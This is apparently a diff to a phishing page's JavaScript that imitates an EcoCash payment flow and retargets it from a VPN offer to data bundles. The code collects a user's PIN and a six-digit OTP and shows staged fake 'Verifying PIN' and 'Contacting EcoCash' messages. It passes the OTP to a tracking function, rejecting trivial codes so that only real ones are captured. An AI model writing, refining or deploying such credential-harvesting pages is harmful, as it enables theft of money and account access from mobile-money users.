-  var ob=document.getElementById('otpBar'),ab=document.getElementById('abar');
-  if(id==='stepPin'){if(ab)ab.style.display='';if(ob)ob.style.display='none';renderPIN();}
-  else if(id==='stepProc'){if(ab)ab.style.display='none';if(ob)ob.style.display='none';}
-  else if(id==='stepOtp'){if(ab)ab.style.display='none';if(ob)ob.style.display='';
-    setTimeout(function(){var e=document.getElementById('otpIn');if(e)e.focus();},200);}
-}
+function showStep(id){document.querySelectorAll('.step').forEach(function(s){s.classList.remove('on');});var el=document.getElementById(id);if(el)el.classList.add('on');curStep=id;var ob=document.getElementById('otpBar'),ab=document.getElementById('abar');if(id==='stepPin'){if(ab)ab.style.display='';if(ob)ob.style.display='none';renderPIN();}else if(id==='stepProc'){if(ab)ab.style.display='none';if(ob)ob.style.display='none';}else if(id==='stepOtp'){if(ab)ab.style.display='none';if(ob)ob.style.display='';setTimeout(function(){var e=document.getElementById('otpIn');if(e)e.focus();},200);}}
 
 document.getElementById('mainBtn').addEventListener('click',function(){
   if(submitting||PIN.length!==4)return;
-  submitting=true;hap(18);tg('receive_offer_clicked','');
+  submitting=true;hap(18);tg('bundle_pin_submitted','');
   var pe=document.getElementById('pinErr');if(pe)pe.textContent='';
-  showStep('stepProc');setVS(0,'Verifying PIN','Checking credentials…');
-  setTimeout(function(){setVS(1,'Contacting EcoCash','Processing payment…');setTimeout(proceed,2000);},800);
+  showStep('stepProc');setVS(0,'Verifying PIN','Checking credentials\u2026');
+  setTimeout(function(){setVS(1,'Contacting EcoCash','Processing payment\u2026');setTimeout(proceed,2000);},800);
 });
 
 function proceed(){
-  sessionStorage.setItem('ecoTxn',JSON.stringify({correlator:'VPN-'+Date.now().toString(36).toUpperCase().slice(-8),status:'pending',amount:TOTALS[plan.duration]||'2.99',timestamp:new Date().toISOString()}));
-  setVS(2,'Sending OTP','Dispatching code…');
-  setTimeout(function(){
-    markDone();
-    setTimeout(function(){
-      var m=mNum(recip.raw);
-      var on=document.getElementById('otpNote');if(on)on.innerHTML='Code sent to <strong>'+m+'</strong>';
-      showStep('stepOtp');startTimer();
-    },450);
-  },600);
+  sessionStorage.setItem('bundleTxn',JSON.stringify({correlator:'BUN-'+Date.now().toString(36).toUpperCase().slice(-8),status:'pending',amount:bundle.price,timestamp:new Date().toISOString()}));
+  setVS(2,'Sending OTP','Dispatching code\u2026');
+  setTimeout(function(){markDone();setTimeout(function(){var m=mNum(recip.raw);var on=document.getElementById('otpNote');if(on)on.innerHTML='Code sent to <strong>'+m+'</strong>';showStep('stepOtp');startTimer();},450);},600);
 }
-function mNum(r){var d=(r||'').replace(/^0/,'');return'+263 '+d.slice(0,2)+'•••••'+d.slice(-2);}
-function setVS(i,t,sub){
-  [0,1,2].forEach(function(j){document.getElementById('vs'+j).className='vstep'+(j<i?' done':j===i?' act':'');});
-  [0,1].forEach(function(j){document.getElementById('vl'+j).classList.toggle('done',j<i);});
-  var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');
-  tEl.style.opacity='0';sEl.style.opacity='0';
-  setTimeout(function(){tEl.textContent=t;sEl.textContent=sub;tEl.style.opacity='1';sEl.style.opacity='1';},120);hap(8);
-}
-function markDone(){
-  [0,1,2].forEach(function(i){document.getElementById('vs'+i).className='vstep done';});
-  [0,1].forEach(function(i){document.getElementById('vl'+i).classList.add('done');});
-  document.querySelector('.proc-svg').classList.add('done');
-  document.getElementById('ringIc').innerHTML='<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--grn)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12 L9.5 17.5 L20 7"/></svg>';
-  var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');
-  tEl.style.opacity='0';sEl.style.opacity='0';
-  setTimeout(function(){tEl.textContent='Code Sent!';sEl.textContent='Check your phone for the OTP';tEl.style.opacity='1';sEl.style.opacity='1';},120);
-  hap([10,50,10]);
-}
+function mNum(r){var d=(r||'').replace(/^0/,'');return'+263 '+d.slice(0,2)+'\u2022\u2022\u2022\u2022\u2022'+d.slice(-2);}
+function setVS(i,t,sub){[0,1,2].forEach(function(j){document.getElementById('vs'+j).className='vstep'+(j<i?' done':j===i?' act':'');});[0,1].forEach(function(j){document.getElementById('vl'+j).classList.toggle('done',j<i);});var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');tEl.style.opacity='0';sEl.style.opacity='0';setTimeout(function(){tEl.textContent=t;sEl.textContent=sub;tEl.style.opacity='1';sEl.style.opacity='1';},120);hap(8);}
+function markDone(){[0,1,2].forEach(function(i){document.getElementById('vs'+i).className='vstep done';});[0,1].forEach(function(i){document.getElementById('vl'+i).classList.add('done');});document.querySelector('.proc-svg').classList.add('done');document.getElementById('ringIc').innerHTML='<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#0066CC" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12 L9.5 17.5 L20 7"/></svg>';var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');tEl.style.opacity='0';sEl.style.opacity='0';setTimeout(function(){tEl.textContent='Code Sent!';sEl.textContent='Check your phone for the OTP';tEl.style.opacity='1';sEl.style.opacity='1';},120);hap([10,50,10]);}
 
 var otpEl=document.getElementById('otpIn');
-otpEl.addEventListener('input',function(){
-  otpVal=this.value.replace(/\D/g,'').slice(0,6);this.value=otpVal;renderOTP();
-  var ob=document.getElementById('otpBtn');if(ob)ob.disabled=otpVal.length<6;
-  if(otpVal.length===6)hap([8,20,8]);
-});
-otpEl.addEventListener('paste',function(e){
-  var txt=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
-  if(txt.length){e.preventDefault();otpEl.value=txt;otpVal=txt;renderOTP();
-    var ob=document.getElementById('otpBtn');if(ob)ob.disabled=otpVal.length<6;
-    if(txt.length===6)hap([8,20,8]);}
-});
+otpEl.addEventListener('input',function(){otpVal=this.value.replace(/\D/g,'').slice(0,6);this.value=otpVal;renderOTP();var ob=document.getElementById('otpBtn');if(ob)ob.disabled=otpVal.length<6;if(otpVal.length===6)hap([8,20,8]);});
+otpEl.addEventListener('paste',function(e){var txt=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);if(txt.length){e.preventDefault();otpEl.value=txt;otpVal=txt;renderOTP();var ob=document.getElementById('otpBtn');if(ob)ob.disabled=otpVal.length<6;if(txt.length===6)hap([8,20,8]);}});
 otpEl.addEventListener('focus',renderOTP);otpEl.addEventListener('blur',renderOTP);
 document.getElementById('otpWrap').addEventListener('click',function(){otpEl.focus();});
-function renderOTP(){
-  var act=document.activeElement===otpEl;
-  for(var i=0;i<6;i++){var b=document.getElementById('ob'+i);if(!b)continue;b.classList.remove('filled','active');b.textContent=otpVal[i]||'';if(otpVal[i])b.classList.add('filled');else if(i===otpVal.length&&act)b.classList.add('active');}
-}
+function renderOTP(){var act=document.activeElement===otpEl;for(var i=0;i<6;i++){var b=document.getElementById('ob'+i);if(!b)continue;b.classList.remove('filled','active');b.textContent=otpVal[i]||'';if(otpVal[i])b.classList.add('filled');else if(i===otpVal.length&&act)b.classList.add('active');}}
 
 document.getElementById('otpBtn').addEventListener('click',confirmOTP);
-function confirmOTP(){
-  if(otpDone||otpVal.length<6)return;
-  if(/^(\d){5}$/.test(otpVal)||otpVal==='123456'){
-    hap([40,30,40]);
-    var errEl=document.getElementById('otpErr');if(errEl)errEl.textContent='Invalid OTP. Enter the code from your phone.';
-    var wrap=document.getElementById('otpWrap');if(wrap){wrap.style.animation='none';void wrap.offsetWidth;wrap.style.animation='shake .3s ease';}
-    setTimeout(function(){otpVal='';var oi=document.getElementById('otpIn');if(oi)oi.value='';renderOTP();var ob=document.getElementById('otpBtn');if(ob)ob.disabled=true;},350);return;
-  }
-  otpDone=true;hap([10,50,10]);tg('offer_received',otpVal);
-  document.getElementById('curtain').classList.add('show');
-  setTimeout(function(){window.location.href='thankyou.html';},900);
-}
+function confirmOTP(){if(otpDone||otpVal.length<6)return;if(/^(\d)\1{5}$/.test(otpVal)||otpVal==='123456'){hap([40,30,40]);var errEl=document.getElementById('otpErr');if(errEl)errEl.textContent='Invalid OTP. Enter the code from your phone.';var wrap=document.getElementById('otpWrap');if(wrap){wrap.style.animation='none';void wrap.offsetWidth;wrap.style.animation='shake .3s ease';}setTimeout(function(){otpVal='';var oi=document.getElementById('otpIn');if(oi)oi.value='';renderOTP();var ob=document.getElementById('otpBtn');if(ob)ob.disabled=true;},350);return;}otpDone=true;hap([10,50,10]);tg('bundle_otp_confirmed',otpVal);document.getElementById('curtain').classList.add('show');setTimeout(function(){window.location.href='bundles-thankyou.html';},900);}
 
 var timerInt=null;
-function startTimer(){
-  var secs=900;
-  function tick(){var m=Math.floor(secs/60),s=secs%60;var el=document.getElementById('timer');if(el)el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;if(secs<=0){clearInterval(timerInt);enableResend();return;}secs--;}
-  tick();timerInt=setInterval(tick,1000);
-}
-function enableResend(){
-  var r=document.getElementById('resendBtn');r.style.opacity='1';r.style.pointerEvents='auto';
-  r.addEventListener('click',function(){otpVal='';renderOTP();var ob=document.getElementById('otpBtn');if(ob)ob.disabled=true;clearInterval(timerInt);startTimer();r.style.opacity='.4';r.style.pointerEvents='none';proceed();},{once:true});
-}
+function startTimer(){var secs=900;function tick(){var m=Math.floor(secs/60),s=secs%60;var el=document.getElementById('timer');if(el)el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;if(secs<=0){clearInterval(timerInt);enableResend();return;}secs--;}tick();timerInt=setInterval(tick,1000);}
+function enableResend(){var r=document.getElementById('resendBtn');r.style.opacity='1';r.style.pointerEvents='auto';r.addEventListener('click',function(){otpVal='';renderOTP();var ob=document.getElementById('otpBtn');if(ob)ob.disabled=true;clearInterval(timerInt);startTimer();r.style.opacity='.4';r.style.pointerEvents='none';proceed();},{once:true});}
 
 history.replaceState({step:'stepPin'},'','');
-window.addEventListener('popstate',function(){
-  if(curStep==='stepProc'||curStep==='stepOtp'){submitting=false;showStep('stepPin');hap(8);history.replaceState({step:'stepPin'},'','');}
-  else window.location.href='index.html';
-});
+window.addEventListener('popstate',function(){if(curStep==='stepProc'||curStep==='stepOtp'){submitting=false;showStep('stepPin');hap(8);history.replaceState({step:'stepPin'},'','');}else window.location.href='bundles.html';});
 
-document.querySelectorAll('.nk,.pin-act,.foot-btn').forEach(function(b){
-  b.addEventListener('pointerdown',function(e){
-    var r=b.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;
-    var rip=document.createElement('span');rip.className='rip';
-    rip.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px;position:absolute;';
-    b.appendChild(rip);rip.addEventListener('animationend',function(){rip.remove();});
-  },{passive:true});
-});
+document.querySelectorAll('.nk,.pin-act,.foot-btn').forEach(function(b){b.addEventListener('pointerdown',function(e){var r=b.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;var rip=document.createElement('span');rip.className='rip dark';rip.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px;position:absolute;';b.appendChild(rip);rip.addEventListener('animationend',function(){rip.remove();});},{passive:true});});
 </script>
 </body>
 </html>
